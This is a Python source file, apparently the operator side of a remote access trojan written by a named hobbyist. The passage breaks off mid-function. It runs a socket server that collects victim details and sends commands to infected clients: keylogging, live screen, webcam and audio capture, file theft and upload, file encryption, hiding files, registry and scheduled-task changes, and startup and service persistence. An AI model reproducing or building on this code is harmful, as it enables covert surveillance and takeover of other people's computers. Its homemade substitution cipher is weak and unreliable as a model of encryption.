# CREATOR 
# GitHub https://github.com/cppandpython
# NAME: Vladislav 
# SURNAME: Khudash  
# AGE: 16

# DATE: 01.08.2025
# APP: BOT
# TYPE: BOT_SESSION_SOCKET
# VERSION: LATEST
# PLATFORM: ANY


# IF YOU NEED TO SPECIFY MANUALLY
#--------------------------------#
MY_IP_ADDRESS = ''
#--------------------------------#


# FOR ENCRYPTION OR DECRYPTION
#------------------------------#
KEY_SESSION = ''
KEY_LENGTH = ''
KEY_PATTERN_MAIN = ''
KEY_PATTERN_ANOTHER = ''
PATTERN_SYMBOLS = []
KEY_SYMBOLS = ''
#------------------------------#


from socket import (
    socket, 
    gethostname, 
    gethostbyname, 
    AF_INET, 
    SOL_SOCKET, 
    SOCK_STREAM, 
    SO_REUSEADDR
)
from os import mkdir, abort, system as shell
from os.path import exists, isfile, abspath
from webbrowser import open as open_website
from platform import node, system, release
from subprocess import run, PIPE, DEVNULL
from wave import open as open_audio
from ipaddress import ip_address
from pickle import dumps, loads
from random import choice, seed
from datetime import datetime
from json import dump, load
from sys import platform
from time import sleep
from re import search


def init():
    global pg, detect, PyAudio, tabulate, is_android, KEY_SESSION, KEY_LENGTH, KEY_PATTERN_MAIN, KEY_PATTERN_ANOTHER, PATTERN_SYMBOLS, KEY_SYMBOLS, session_symbols
        
    if not KEY_SESSION.isdigit():
        KEY_SESSION = '2008'

    if not KEY_LENGTH.isdigit():
        KEY_LENGTH = '6'

    if not KEY_PATTERN_MAIN or type(KEY_PATTERN_MAIN) is not str:
        KEY_PATTERN_MAIN = '$#&'

    if not KEY_PATTERN_ANOTHER or type(KEY_PATTERN_ANOTHER) is not str:
        KEY_PATTERN_ANOTHER = '!*^'

    if not PATTERN_SYMBOLS or type(PATTERN_SYMBOLS) is not list:
        PATTERN_SYMBOLS = [' ', '\n', '\r', '\t', '\f', '\v', '=', '+', '-', '*', '/', '%', '<', '>', '^', '~', '&', '|', '!', '?', '@', '#', '$', ':', ';', '.', ',', '\\', '\'', '"', '`', '(', ')', '[', ']', '{', '}', '_', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'z', 'x', 'c', 'v', 'b', 'n', 'm', 'Q', 'W', 'E', 'R', 'T', 'Y', 'U', 'I', 'O', 'P', 'A', 'S', 'D', 'F', 'G', 'H', 'J', 'K', 'L', 'Z', 'X', 'C', 'V', 'B', 'N', 'M', 'а', 'б', 'в', 'г', 'д', 'е', 'ё', 'ж', 'з', 'и', 'й', 'к', 'л', 'м', 'н', 'о', 'п', 'р', 'с', 'т', 'у', 'ф', 'х', 'ц', 'ч', 'ш', 'щ', 'ъ', 'ы', 'ь', 'э', 'ю', 'я', 'А', 'Б', 'В', 'Г', 'Д', 'Е', 'Ё', 'Ж', 'З', 'И', 'Й', 'К', 'Л', 'М', 'Н', 'О', 'П', 'Р', 'С', 'Т', 'У', 'Ф', 'Х', 'Ц', 'Ч', 'Ш', 'Щ', 'Ъ', 'Ы', 'Ь', 'Э', 'Ю', 'Я']
        
    if not KEY_SYMBOLS or type(KEY_SYMBOLS) is not str:
        KEY_SYMBOLS = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&()*+,-.:;<=>?@[]^_{|}~'

    if platform == 'linux' and exists('Android') and exists('DCIM'):
        is_android = True 
    else: 
        is_android = False

    seed(int(KEY_SESSION))

    if not is_android:
        try: 
            import pygame as pg
        except: 
            install_module('pygame')
        
        try: 
            from pyaudio import PyAudio
        except: 
            install_module('pyaudio')

    try: 
        from tabulate import tabulate
    except: 
        install_module('tabulate')

    try: 
        from chardet import detect
    except: 
        install_module('chardet')
  
    session_symbols = {}

    for symbol in PATTERN_SYMBOLS:
        session_symbols[symbol] = generator_symbols()


def generator_symbols():
    symbols = ''

    for _ in range(int(KEY_LENGTH)):
        symbols += choice(KEY_SYMBOLS)

    return symbols
    

def encrypt_string(string):
    global session_symbols, PATTERN_SYMBOLS

    string = str(string)
    result = ''

    for n in string:
        if not n in session_symbols:
            PATTERN_SYMBOLS.append(n)
            session_symbols[n] = generator_symbols()

        if n in session_symbols:
            result += KEY_PATTERN_MAIN + session_symbols[n]
        else:
            result += KEY_PATTERN_ANOTHER + session_symbols[n]
    
    return result


def decrypt_string(string):
    string = str(string)
    result = ''

    for n in string.split(KEY_PATTERN_MAIN):
        symbol, *another_symbol = n.split(KEY_PATTERN_ANOTHER)

        for sym in session_symbols.items():
            if sym[-1] == symbol:
                result += sym[0]
                break

        if another_symbol:
            result += ''.join(another_symbol)

    return result


def send_msg(_socket, string):
    if type(string) is bytes:
        string = string.decode()

    data = encrypt_string(string).encode()
    _socket.sendall(data)


def receive_msg(_socket, flag=False):
    try:
        data = _socket.recv(1_000_000_000)
    except:
        data = _socket.recv(1_000_000)

    if flag:
        return data
    else:
        return decrypt_string(data.decode())
    

def clear_output(): 
    shell('cls') if platform == 'win32' else shell('clear')


def install_module(module):
    clear_output()
    
    if input(f'Install this module {module} for the program to work correctly\n' + 
        f'pip install {module}\n' + 'Yes\\No: '
    ).lower().strip() == 'yes': 
        shell(f'pip install {module}')
        clear_output()
        shell(f'python "{__file__}"'), abort()

    clear_output()


def get_date(): 
    try:
        return datetime.now().strftime('%H:%M %d.%m.%Y').split() 
    except: 
        return ['NOT FOUND', 'NOT FOUND']


def cmd(result):
    if type(result) is bytes:
        try: 
            return result.decode(detect(result)['encoding'])
        except: 
            return result.decode('cp866') 


def ctrl_c(client=None, mode=0):
    clear_output()

    while True:
        try:
            try: 
                user_selection = input('Do you want to exit?\nYes\\No: ').strip().lower()
            except:  
                clear_output()
                continue

            match user_selection:
                case 'yes': 
                    if mode == 1: 
                        send_msg(client, 'exit')
                    
                    abort()
                case 'no': 
                    clear_output()
                    return
                case _: 
                    clear_output()
        except: 
            continue


def play_audio(client_ip):
    audio = PyAudio()

    with open_audio(f'session_{client_ip}/tool/data/sound.mp3', 'rb') as sound_mp3:
        stream = audio.open(format=audio.get_format_from_width(sound_mp3.getsampwidth()), channels=sound_mp3.getnchannels(), 
                            rate=sound_mp3.getframerate(), output=True)
        data = sound_mp3.readframes(1024)

        while data:
            stream.write(data)
            data = sound_mp3.readframes(1024)

    stream.stop_stream()
    stream.close()
    audio.terminate()


def share(client, client_ip, type_share, mode=0):
    

    def print_info(mode=0):
        match type_share:
            case 'screenshare': 
                print(f'Start desktop broadcast {client_ip} [*]') if (mode == 0
                    ) else print(f'Exit desktop broadcast {client_ip} [-]')
            case 'webcamshare': 
                print(f'Start webcam broadcast {client_ip} [*]') if (mode == 0
                    ) else print(f'Exit webcam broadcast {client_ip} [-]')
            case _: 
                print(f'Start audio broadcast {client_ip} [*]') if (mode == 0
                    ) else print(f'Exit audio broadcast {client_ip} [-]')
    
    print(f'Share mode [{type_share}]')
    
    with open(f'session_{client_ip}/tool/data/client_data.json', 'r') as session_json: 
        session_data = load(session_json)
    
    if is_android:
        if not exists(f'session_{client_ip}/tool/broadcaster.html'): 
            print(f'session_{client_ip}/tool/broadcaster.html [+]')
        
        with open(f'session_{client_ip}/tool/broadcaster.html', 'w') as broadcaster_html: 
            broadcaster_html.write(rf'''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="refresh" content="1">
    <title>{client_ip}</title>''' + '''
    <style>
        img {
            max-width: 100%;
        }
    </style>''' + f'''
</head>
<body>
    <img src="data/img.png" alt="{session_data["node"]}" width="500" title="{session_data["node"]}">
    <p>HOST: {session_data["host"]}:{session_data["port"]}</p>
    <p>NODE: {session_data["node"]}</p>
    <p>USER: {session_data["user"]}</p>
    <p>PLATFORM: {session_data["platform"]}</p>
    <p>SCREEN_RESOLUTION: {session_data["screen_resolution"]}</p>
    <p>CONNECTION_DATE: {session_data["connection_date"]}</p>
</body>
</html>''')
            
        if mode == 0: 
            print(f'Open session_{client_ip}/tool/broadcaster.html [+]')
            open_website(abspath(f'session_{client_ip}/tool/broadcaster.html'))
    else:
        if mode != 2 and type_share != 'audioshare':
            x, y = session_data['screen_resolution'].split('x')
            
            try: 
                pg.init()
            except:
                print('Pygame module not installed [-]')
                return
            
            window = pg.display.set_mode((1000, 600), pg.RESIZABLE)
            pg.display.set_caption(
                f'HOST: {session_data["host"]}:{session_data["port"]} | ' + 
                f'NODE: {session_data["node"]} | ' + 
                f'USER: {session_data["user"]} | ' + 
                f'PLATFORM: {session_data["platform"]} | ' + 
                f'SCREEN_RESOLUTION: {session_data["screen_resolution"]} | ' + 
                f'CONNECTION_DATE: {session_data["connection_date"]}'
            )
            current_size = window.get_size()

            screenshot_surface = pg.Surface((int(x), int(y)))
            screenshot_surface.fill((0, 0, 0))
    
    print_info()
    print(f'To exit {type_share}, press CTRL + C')

    while True:
        try:
            try:
                if mode == 0:
                    if is_android:
                        with open(f'session_{client_ip}/tool/data/img.png', 'wb') as img_png: 
                            img_png.write(receive_msg(client, flag=True))
                    else:
                        for event in pg.event.get():
                            if event.type == pg.QUIT:
                                pg.quit()
                                send_msg(client, 'ctrl_c')
                                print_info(1)
                                
                                return
                            elif event.type == pg.VIDEORESIZE: 
                                current_size = event.size
                        try:
                            with open(f'session_{client_ip}/tool/data/img.png', 'wb') as img_png: 
                                img_png.write(
                                    receive_msg(client, flag=True))
                           
                            screenshot_surface.blit(
                                pg.transform.scale(
                                        pg.image.load(
                                            f'session_{client_ip}/tool/data/img.png'
                                        ).convert_alpha(), 
                                    (int(x), int(y))
                                ), (0, 0)
                            )
                            window.blit(
                                pg.transform.scale(screenshot_surface, current_size), (0, 0))
                        except: ...
                        
                        pg.display.flip()
                else:
                    with open(f'session_{client_ip}/tool/data/sound.mp3', 'wb') as sound_mp3: 
                        sound_mp3.write(
                            receive_msg(client, flag=True))

                    play_audio(client_ip)
            except KeyboardInterrupt:
                if not is_android and type_share != 'audioshare': 
                    pg.quit()

                send_msg(client, 'ctrl_c')
                print_info(1)
                return
            try: 
                if is_android: 
                    sleep(1)

                send_msg(client, 'continue')
            except KeyboardInterrupt: 
                if not is_android and type_share != 'audioshare':
                    pg.quit()

                send_msg(client, 'ctrl_c')
                print_info(1)
                return
        except NameError: 
            print('Pyaudio module not installed [-]')
            return 
        except ConnectionError: 
            return
        except: 
            continue


def get_my_ip_address():


    def get_ip():
        if platform == 'win32':
            _ip = search(
                r'IPv4.+[:]\s(\d+[.]\d+[.]\d+[.]\d+)', 
                cmd(run('ipconfig', stdout=PIPE,stderr=DEVNULL, shell=True).stdout)
            ).group(1)
        else:
            _ip = search(
                r'scope link src (\d+[.]\d+[.]\d+[.]\d+)', 
                cmd(run('ip route', stdout=PIPE, stderr=DEVNULL, shell=True).stdout)
            ).group(1)
        
        return _ip


    try:
        ip = gethostbyname(gethostname())

        try: 
            ip_address(ip)
        except: 
            ip = get_ip()
        else: 
            if ip == '127.0.0.1': 
                if platform == 'win32':
                    ip = get_ip()
    except: 
        raise ConnectionError('No internet connection')
    
    return ip
    

def search_sessions():
    global my_ip_address, flag_search_sessions


    def create_directories(mode=0):
        for folder_path in [
            f'session_{client_ip}', 
            f'session_{client_ip}/tool', 
            f'session_{client_ip}/tool/data', 
            f'session_{client_ip}/downloads', 
            f'session_{client_ip}/records', 
            f'session_{client_ip}/records/screen', 
            f'session_{client_ip}/records/webcam', 
            f'session_{client_ip}/records/audio', 
            f'session_{client_ip}/screenshots'
        ]:
            try:
                if not exists(folder_path): 
                    if mode == 0: 
                        print(f'{folder_path} [+]')
                        sleep(0.5)
                        clear_output()

                    mkdir(folder_path)
            except: 
                continue


    def send_password_session(client, address):
        client_user = receive_msg(client)

        while True:
            send_msg(client, '__SESSION__PASSWORD__')

            try: 
                user_password = input(f'Enter password <{client_user}@{address[0]}:{address[-1]}>: ').strip()
            except KeyboardInterrupt:   
                ctrl_c()
                send_msg(client, 'ctrl_c')
                continue
            except: 
                send_msg(client, 'Password is incorrect')
                continue
            
            match user_password:
                case '': 
                    send_msg(client, 'empty')
                case 'exit': 
                    ctrl_c(client, mode=1)
                    send_msg(client, 'ctrl_c') 
                case 'clear': 
                    clear_output() 
                    send_msg(client, 'clear')
                    continue
                case _: 
                    send_msg(client, user_password)
                    result_password_check = receive_msg(client)

                    if result_password_check == 'Session login completed': 
                        clear_output()
                        print(f'{result_password_check} [+]')
                        sleep(1)
                        clear_output()
                        return
                    else: 
                        print(result_password_check)


    flag_created_server = True
    flag_search_sessions = True

    clients_blocked = {} 
    counter_session = -1

    try: 
        _node = node()
    except: 
        _node = 'NOT FOUND'
    
    try: 
        _platform = system()
    except: 
        _platform = 'NOT FOUND'
    
    try: 
        _release = release()
    except: 
        _release = 'NOT FOUND'
    
    clear_output()
    print('Author: Vladislav Khudash')
    sleep(3)
    
    clear_output()
    print('Preparing server for sessions [*]')
    sleep(1)
    
    while True:
        try: 
            if not MY_IP_ADDRESS:
                try: 
                    ip_address(my_ip_address)
                except:
                    my_ip_address = get_my_ip_address()
            else:
                my_ip_address = MY_IP_ADDRESS

            with socket(AF_INET, SOCK_STREAM) as session:
                session.bind((my_ip_address, 49_050))
                session.setsockopt(SOL_SOCKET, SO_REUSEADDR, True)
                session.listen()

                if flag_created_server:

                    clear_output()
                    print(f'Created server {my_ip_address}:49050 [+]\n' + 
                        'Server is running [*]\n' + 'Waiting for sessions [*]')

                client, address = session.accept()

                with client:
                    send_msg(client, '__DATE__')
                    session_connection_date = receive_msg(client)
                    send_msg(client, '__PLATFORM__')
                    session_connection_client_platform = receive_msg(client)
                    about_session = tabulate([(
                            session_connection_date, 
                            address[0], 
                            session_connection_client_platform,
                            str(address[-1]))
                        ], 
                        headers=[('DATE'), ('HOST'), ('PLATFORM'), ('PORT')], 
                        tablefmt='grid'
                    )
                    
                    try: 
                        client_ip
                    except: ...
                    else:
                        if (not client_ip in clients_blocked) and (client_ip == address[0]):    
                            connection_date_with_client = get_date()

                            clear_output()
                            print(f'Join session {client_ip}:{address[-1]} [*]')
                            send_msg(client, '__START__')
                            sleep(1)
                            clear_output()
                            client.sendall(dumps({
                                'session_state': encrypt_string('on'), 
                                'node': encrypt_string(_node), 
                                'host': encrypt_string(my_ip_address), 
                                'port': encrypt_string(address[-1]), 
                                'platform': encrypt_string(f'{_platform} {_release}'), 
                                'connection_date': encrypt_string(f'{connection_date_with_client[0]} | {connection_date_with_client[-1]}')})
                            )
                            send_msg(client, '__REGISTER__')
                            
                            if receive_msg(client) == '__START_REGISTRATION__': 
                                clear_output()
                                print(f'Register for session {client_ip}:{address[-1]} [*]')
                                sleep(1)
                                clear_output()
                                send_password_session(client, address)
                                
                                continue
                            else:
                                create_directories()

                                client_data = loads(client.recv(1_000_000_000))
                                client_data = {
                                    'host': decrypt_string(client_data['host']),
                                    'port': decrypt_string(client_data['port']),
                                    'node': decrypt_string(client_data['node']),
                                    'user': decrypt_string(client_data['user']),
                                    'platform': decrypt_string(client_data['platform']),
                                    'screen_resolution': decrypt_string(client_data['screen_resolution']),
                                    'connection_date': decrypt_string(client_data['connection_date'])
                                }

                                if not exists(f'session_{client_ip}/tool/data/client_data.json'):
                                    print(f'session_{client_ip}/tool/data/client_data.json [+]')
                                    sleep(0.5)
                                    clear_output()

                                with open(f'session_{client_ip}/tool/data/client_data.json', 'w') as client_data_json: 
                                    dump(client_data, client_data_json, indent=4, ensure_ascii=False)
                               
                                print(f'Connection to session was successful {client_ip}:{address[-1]} [+]')
                                sleep(1)
                                clear_output()
                                print(about_session) 
                                
                                while True:   
                                    try: 
                                        create_directories(1), 
                                        executor(
                                            client, 
                                            input(f'<{client_data["user"]}@{client_ip}:{address[-1]}>: ').strip(), 
                                            about_session, client_ip
                                        )
                                    except KeyboardInterrupt:   
                                        ctrl_c(client, mode=1)
                                        send_msg(client, 'ctrl_c')
                                        
                                        continue
                                    except ConnectionError:
                                        flag_search_sessions = True
                                        client_ip = ''
                                        counter_session = 0
                                        
                                        clear_output()
                                        print(f'Session was lost {address[0]}:{address[-1]} [-]')
                                        sleep(5)
                                        clear_output()
                                        print('Waiting for sessions [*]')
                                        
                                        break  
                                    except: 
                                        send_msg(client, 'Command is incorrect')
                                        
                                        continue
                    
                    flag_created_server = False
                    clients_blocked[address[0]] = about_session
                    counter_session += 1

                    clear_output()

                    if flag_search_sessions:
                        print('Search for sessions [*]')
                    else:
                        print(f'Session found {address[0]}:{address[-1]} [+]')
                    
                    sleep(1)

                    if counter_session >= 5: 
                        client_ip = select_session(clients_blocked)

                        clear_output()
                        send_msg(client, '__RESTART__')
                        clear_output()
                        
                        continue
                    
                    flag_search_sessions = False
                    send_msg(client, '__CONTINUE__')    
        except KeyboardInterrupt:
             ctrl_c()
             
             continue
        except: 
            continue


def select_session(clients):


    def show_sessions(): 
        for ip in clients: 
            print(clients[ip])


    connect_to_client = ''

    clear_output()
    show_sessions()

    while True:
        try: 
            select_client_ip_address = input('Enter host: ').strip()
        except KeyboardInterrupt: 
            ctrl_c()
            show_sessions()
            
            continue
        except: 
            continue

        if clients.get(select_client_ip_address, False):
            for client_ip_address in clients.keys():
                if select_client_ip_address == client_ip_address:
                    connect_to_client += client_ip_address
                    
                    break
            
            del clients[select_client_ip_address] 
            
            break
        else: 
            match select_client_ip_address:
                case '': 
                    continue 
                case 'exit': 
                    ctrl_c()
                    show_sessions()
                case 'clear': 
                    clear_output()
                    show_sessions()
                    
                    continue
                case _:
                    print(f'Host not found --> {select_client_ip_address}') 
    
    return connect_to_client


def executor(client, command, about_session, client_ip):
    global flag_search_sessions
    

    def clean_file_name(path):
        if '\\' in path: 
            return path[path.rindex('\\') + 1:]
        elif '/' in path: 
            return path[path.rindex('/') + 1:]
        else: 
            return path
        

    def create_file_path(file_type):
        file_date = get_date()

        return file_type + '-' + '_'.join(file_date[0].split(':')) + '_' + \
            datetime.now().strftime('%S') + '-' + file_date[-1]
    
    
    try:
        if cd_path := search(r'^cd (\S?.+)', command).group(1): 
            send_msg(client, f'cd {cd_path}')
            
            if 'An error occurred in cd' in (cd_error := receive_msg(client)):
                print(cd_error)

            return
    except: ...

    try: 
        if hide_path := search(r'^hide (\S?.+)', command).group(1):
            send_msg(client, f'hide {hide_path}')
            
            if 'An error occurred in hide' in (hide_error := receive_msg(client)): 
                print(hide_error)

            return 
    except: ...  

    try: 
        if unhide_path := search(r'^unhide (\S?.+)', command).group(1):
            send_msg(client, f'unhide {unhide_path}')
            
            if 'An error occurred in unhide' in (unhide_error := receive_msg(client)): 
                print(unhide_error) 

            return 
    except: ...

    try:
        if mkdir_path := search(r'^mkdir (\S?.+)', command).group(1):
            send_msg(client, f'mkdir {mkdir_path}')
            
            if 'An error occurred in mkdir' in (mkdir_error := receive_msg(client)): 
                print(mkdir_error) 

            return
    except: ...

    try:
        if mkfile_path := search(r'^mkfile (?P<path>\S?.+) -c (?P<content>\S?.+)', command).groupdict():
            send_msg(client, f'mkfile {mkfile_path["path"]} -c {mkfile_path["content"]}')
            
            if 'An error occurred in mkfile' in (mkfile_error := receive_msg(client)): 
                print(mkfile_error)

            return
    except: ...

    try: 
        if rn_path := search(r'^rn (?P<path>\S?.+) -t (?P<new_name>\S?.+)', command).groupdict():
            send_msg(client, f'rn {rn_path["path"]} -t {rn_path["new_name"]}')
            
            if 'An error occurred in rn' in (rn_error := receive_msg(client)): 
                print(rn_error)

            return
    except: ...

    try: 
        if rmdir_path := search(r'^rmdir (\S?.+)', command).group(1):
            send_msg(client, f'rmdir {rmdir_path}') 
            
            if 'An error occurred in rmdir' in (rmdir_error := receive_msg(client)): 
                print(rmdir_error) 

            return
    except: ...

    try: 
        if rm_path := search(r'^rm (\S?.+)', command).group(1):
            send_msg(client, f'rm {rm_path}')
            
            if 'An error occurred in rm' in (rm_error := receive_msg(client)): 
                print(rm_error)        

            return
    except: ...

    try: 
        if cp_path := search(r'^cp (?P<path_from>\S?.+) -t (?P<path_to>\S?.+)', command).groupdict():
            send_msg(client, f'cp {cp_path["path_from"]} -t {cp_path["path_to"]}') 
            
            if 'An error occurred in cp' in (cp_error := receive_msg(client)): 
                print(cp_error)

            return
    except: ...

    try: 
        if mv_path := search(r'^mv (?P<path_from>\S?.+) -t (?P<path_to>\S?.+)', command).groupdict():
            send_msg(client, f'mv {mv_path["path_from"]} -t {mv_path["path_to"]}') 
           
            if 'An error occurred in mv' in (mv_error := receive_msg(client)): 
                print(mv_error)

        return
    except: ...   
    
    try: 
        if download_path := search(r'^download (\S?.+)', command).group(1).strip():
            send_msg(client, f'download {download_path}')
            
            if 'An error occurred in download'.encode() in (download_data := receive_msg(client,flag=True)): 
                print(download_data.decode())
            else:  
                with open(f'session_{client_ip}/downloads/{clean_file_name(download_path)}', 'wb') as download_file: 
                    download_file.write(download_data)
               
                print('Downloaded file was saved to this path -->'+ ' ' + 
                      f'session_{client_ip}/downloads/{clean_file_name(download_path)} [+]')
                
            return
    except: ...    
    
    try: 
        if upload_path := search(r'^upload (\S?.+)', command).group(1).strip():
            if isfile(upload_path):
                send_msg(client, f'upload {clean_file_name(upload_path)} in folder tools')
                
                with open(upload_path, 'rb') as upload_file: 
                    client.sendall(upload_file.read())
                
                print(receive_msg(client))
            else: 
                if exists(upload_path):
                    print('Can only send file')
                else:
                    print(f'Path doesn\'t exist --> {upload_path}')
                    send_msg(client, 'upload error')

            return
    except: ... 

    try: 
        if encrypt_file := search(r'^encrypt (?P<path>\S?.+) -p (?P<password>\S?.+)', command).groupdict():
            send_msg(client, f'encrypt {encrypt_file["path"]} -p {encrypt_file["password"]}') 
            
            if 'An error occurred in encrypt' in (encrypt_error := receive_msg(client)): 
                print(encrypt_error)

            return
    except: ...

    try:  
        if decrypt_file := search(r'^decrypt (?P<path>\S?.+) -p (?P<password>\S?.+)', command).groupdict():
            send_msg(client, f'decrypt {decrypt_file["path"]} -p {decrypt_file["password"]}') 
            
            if 'An error occurred in decrypt' in (decrypt_error := receive_msg(client)): 
                print(decrypt_error)      

            return
    except: ...

    try:
        if netsh := search(r'^netsh (\S?.+)', command).group(1):
            send_msg(client, f'netsh {netsh}')
            print(receive_msg(client))

            return
    except: ...

    try:
        if network := search(r'^network (-s|-p|-c|-d)', command).group(1):
            send_msg(client, f'network {network}')
            
            if (network_data := receive_msg(client)) != 'completed':
                print(network_data) 

            return
    except: ...

    try:
        if kill_app := search(r'^kill (-p|-n) (\d+|\S?.+)', command).group(1, 2):
            send_msg(client, f'kill {kill_app[0]} {kill_app[-1]}') 
            
            if 'An error occurred in kill' in (kill_app_error := receive_msg(client)): 
                print(kill_app_error)   

            return
    except: ... 

    try:
        if reg := search(r'^reg (\S?.+)', command).group(1):
            send_msg(client, f'reg {reg}')
            print(receive_msg(client))

            return
    except: ... 

    try:
        if sc := search(r'^sc (\S?.+)', command).group(1):
            send_msg(client, f'sc {sc}')
            print(receive_msg(client))

            return
    except: ... 

    try:
        if schtasks := search(r'^schtasks (\S?.+)', command).group(1):
            send_msg(client, f'schtasks {schtasks}')
            print(receive_msg(client))

            return
    except: ... 

    try:
        if secedit := search(r'^secedit (\S?.+)', command).group(1):
            send_msg(client, f'secedit {secedit}')
            print(receive_msg(client))

            return
    except: ... 

    try:
        if wmic := search(r'^wmic (\S?.+)', command).group(1):
            send_msg(client, f'wmic {wmic}')
            print(receive_msg(client))

            return
    except: ... 

    try:
        if winmgmt := search(r'^winmgmt (\S?.+)', command).group(1):
            send_msg(client, f'winmgmt {winmgmt}')
            print(receive_msg(client))

            return
    except: ... 

    try:
        if user := search(r'^user (\S?.+)', command).group(1):
            send_msg(client, f'user {user}')
            print(receive_msg(client))

            return
    except: ... 

    try:
        if _keylogger := search(r'^keylogger (-g|-r)', command).group(1):
            send_msg(client, f'keylogger {_keylogger}')
            
            if (_keylogger_data := receive_msg(client)) != 'completed': 
                print(_keylogger_data) 

            return
    except: ...

    try: 
        if show_message := search(r'^show (?P<type>-p|-i|-w|-e) (?P<title>\S?.+) -t (?P<text>\S?.+)', command).groupdict():
            send_msg(client, f'show {show_message["type"]} {show_message["title"]} -t {show_message["text"]}')
            
            if (show_message_error := receive_msg(client)) != 'completed': 
                print(show_message_error) 

            return
    except: ...

    if 'module' in command:
        try:
            if _module := search(r'^module (?P<mode>-e|-d) (?P<name>all|agent|keylogger|app)', command).groupdict():
                if _module['mode'] == '-e':
                    print(f'{_module["name"].capitalize()} module is started [+]') 
                else:
                    print(f'{_module["name"].capitalize()} module is disabled [-]')
                
                send_msg(client, f'module {_module["mode"]} {_module["name"]}')
                
                if 'An error occurred in module' in (_module_error := receive_msg(client)):
                    print(_module_error)

                return
        except: ...

        try:
            if search(r'^module (-g)', command).group(1): 
                send_msg(client, 'module -g')
                print(receive_msg(client))

                return
        except: ...

    elif 'accounts' in command:
        try:
            if search(r'^accounts (-g)', command).group(1): 
                send_msg(client, 'accounts -g')
                print(receive_msg(client)) 

                return
        except: ...

        try:
            if account_id := search(r'^accounts -d (\S?.+)[:]\d+', command).group(1): 
                send_msg(client, f'accounts -d {account_id}')
                print(receive_msg(client))

                return
        except: ... 

    elif 'site' in command:
        try:
            if site_url_open := search(r'^site -s (\S?.+)', command).group(1):
                send_msg(client, f'site -s {site_url_open}')
                print(receive_msg(client))

                return
        except: ...

        try:
            if site_block := search(r'^site (-b|-d) (\S?.+)', command).group(1, 2):
                send_msg(client, f'site {site_block[0]} {site_block[-1]}')
                print(receive_msg(client))   

                return
        except: ...

        try:
            if sites_blocked := search(r'^site (-l|-r)', command).group(1):
                send_msg(client, f'site {sites_blocked}')
                print(receive_msg(client))

                return
        except: ...

    elif 'device' in command:
        try:
            if device_mode := search(r'^device (\S?.+)', command).group(1).strip():
                send_msg(client, f'device {device_mode}') 

                if (device_data := receive_msg(client)) != 'completed':
                    print(device_data)
                    
                return
        except: ... 

    elif 'buffer' in command:
        try:
            if search(r'^buffer (-g)', command).group(1):
                send_msg(client, 'buffer -g')
                print(receive_msg(client)) 

                return
        except: ...

        try:
            if copy_of_data_for_buffer := search(r'^buffer -c (\S?.+)', command).group(1):
                send_msg(client, f'buffer -c {copy_of_data_for_buffer}') 
                
                if 'An error occurred in buffer' in (copy_of_data_for_buffer_error := receive_msg(client)): 
                    print(copy_of_data_for_buffer_error)

                return
        except: ...
        
        try:
            if search(r'^buffer (-r)', command).group(1):
                send_msg(client, 'buffer -r')
                
                if 'An error occurred in buffer' in (clear_buffer_error := receive_msg(client)):
                    print(clear_buffer_error)

                return
        except: ...

    elif 'app' in command:
        try:
            if search(r'^app (-g)', command).group(1):
                send_msg(client, 'app -g')
                print(receive_msg(client))

                return
        except: ...  

        try:
            try:
                if app_start := search(r'^app -e (?P<name>\S?.+) -p (?P<path>\S?.+) --args (?P<args>\S?.+)', command).groupdict():
                    is_args = True
            except:
                if app_start := search(r'^app -e (?P<name>\S?.+) -p (?P<path>\S?.+)', command).groupdict():
                    is_args = False

            if is_args:
                send_msg(client, f'app -e {app_start["name"]} -p {app_start["path"]} --args {app_start["args"]}') 
            else:
                send_msg(client, f'app -e {app_start["name"]} -p {app_start["path"]}') 
                
            if 'An error occurred in app' in (app_start_error := receive_msg(client)): 
                print(app_start_error)

            return
        except: ...

        try:
            if app_start := search(r'^app -e -d (\S?.+)', command).group(1):
                send_msg(client, f'app -e -d {app_start}') 
                
                if 'An error occurred in app' in (app_start_error := receive_msg(client)): 
                    print(app_start_error)

                return
        except: ...

        try:
            try:
                if app_launch := search(r'^app -s (?P<path>\S?.+) --args (?P<args>\S?.+)', command).groupdict():
                    is_args = True
            except: 
                if app_launch := search(r'^app -s (?P<path>\S?.+)', command).groupdict():
                    is_args = False

                if is_args:
                    send_msg(client, f'app -s {app_launch["path"]} --args {app_launch["args"]}')
                else:
                    send_msg(client, f'app -s {app_launch["path"]}')  

                if 'An error occurred in app' in (app_launch_error := receive_msg(client)):
                    print(app_launch_error)

                return
        except: ...

        try:
            if app_url := search(r'^app -u (?P<url>\S?.+) -n (?P<name>\S?.+)', command).groupdict():
                send_msg(client, f'app -u {app_url["url"]} -n {app_url["name"]}')
                print(receive_msg(client))

                return
        except: ...

        try:
            if app_startup := search(r'^app -a (?P<name>\S?.+) -p (?P<path>\S?.+)', command).groupdict():
                send_msg(client, f'app -a {app_startup["name"]} -p {app_startup["path"]}')
                print(receive_msg(client)) 

                return
        except: ...

        try:
            if app_startup := search(r'^app -a (\S?.+)', command).group(1):
                send_msg(client, f'app -a {app_startup}')
                print(receive_msg(client))

                return
        except: ...

        try:
            if app_service := search(r'^app -t (?P<name>\S?.+) -n (?P<display_name>\S?.+) -p (?P<path>\S?.+) -d (?P<description>\S?.+)', command).groupdict():
                send_msg(client, f'app -t {app_service["name"]} -n {app_service["display_name"]} -p {app_service["path"]} -d {app_service["description"]}')
                print(receive_msg(client))

                return
        except: ...

        try:
            if app_service := search(r'^app -t (-e|-d) (\S?.+)', command).group(1, 2):
                send_msg(client, f'app -t {app_service[0]} {app_service[-1]}') 
                
                if 'An error occurred in app' in (app_service_error := receive_msg(client)): 
                    print(app_service_error)

                return
        except: ...

        try:
            if app_service := search(r'^app -t (\S?.+)', command).group(1):
                send_msg(client, f'app -t {app_service}')
                print(receive_msg(client))

                return
        except: ...   

        try:
            if app_task := search(r'^app -n (?P<name>\S?.+) -p (?P<file_path>\S?.+)', command).groupdict():
                send_msg(client, f'app -n {app_task["name"]} -p {app_task["file_path"]}')
                print(receive_msg(client))

                return
        except: ...

        try:
            if app_task := search(r'^app -n (-e|-d) (\S?.+)', command).group(1, 2):
                send_msg(client, f'app -n {app_task[0]} {app_task[-1]}') 
                
                if 'An error occurred in app' in (app_task_error := receive_msg(client)): 
                    print(app_task_error)

                return
        except: ...

        try:
